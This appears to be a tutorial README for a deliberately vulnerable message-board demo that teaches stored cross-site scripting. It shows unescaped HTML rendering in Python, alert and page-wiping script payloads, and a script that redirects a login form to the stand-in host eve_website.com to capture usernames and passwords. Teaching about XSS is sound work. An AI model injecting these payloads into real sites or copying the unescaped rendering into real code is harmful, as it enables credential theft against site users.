# Cross Site Scripting (XSS) #
Cross site scripting is a vulnerability where the attacker can add script (usually js) to your page (and make other users run the script).  

## How Can a User Do it? ##
If a dynamic page show user's input in the page (for example a message board or a social website) sometimes the user can insert an HTML tag.  
For example the next program of a message board:
```python
html = '\n'.join([f'{user}: {message} </br>' for user, message  in data])  # show all message with </br> in between
```
If the message will be `<h2>big hello</h1>`, the html code will render a big `big hello` text.  
What about `<script>alert('hey');</script>`?  this will alert hey in the website.  

What else can the user do?
The attacker can insert a js code that make the website unavialable for other users.  
```js
document.body.innerHTML = '';
```

in other cases the attacker can manipulate the website so the legitimate user will give the attacker some vulnerable information (username and password for example). we will show this cas in the next example:  

### Steal username and password ###

if in the same page we have the next form
```HTML
<form method="post", action="/login" id="login_form">
    username: <input type="text" name="username">
    password: <input type="password" name="password">
    <input type="submit" value="Login">
</form>
```

and also have the dynamic html generated by:
```python
html = '\n'.join([f'{user}: {message} </br>' for user, message  in data])  # show all message with </br> in between
```

if the user enter the next code as a message:
```html
hello
<script>
document.addEventListener('DOMContentLoaded', function() {
    var loginForm = document.getElementById('login_form');
    if (loginForm) {
        loginForm.action = 'http://eve_website.com/get_message'; 
    }
});
</script>
```

Now any user that will try to log in will sent his username and password to eve\_website.com, eve\_website can steal the data and return the user to the original website and the user will not notice it at all. (we will not talk about how eve will do it)

## Play With Yourself ##
you can play with yourself in a vulnerable message board website.  
just run the code `main.py`  
the users are
| username | password |
|----------|----------|
| bob      | bob\_p   |
| eve      | eve\_p   |


